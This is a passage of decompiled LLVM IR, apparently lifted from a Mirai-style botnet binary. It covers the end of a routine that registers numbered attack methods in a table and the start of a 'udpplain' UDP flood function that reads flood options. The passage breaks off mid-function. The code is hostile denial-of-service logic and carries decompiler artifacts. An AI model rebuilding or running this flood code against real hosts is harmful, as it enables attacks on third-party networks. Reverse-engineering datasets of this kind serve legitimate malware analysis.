  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_2322c.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_2322c.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_2322c.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_2322c.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_2322c.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_2322c.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_2322c.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_2322c.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_2322c.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i8* bitcast (i8** @global_var_23228.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_23229.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_23228.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23228.29 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
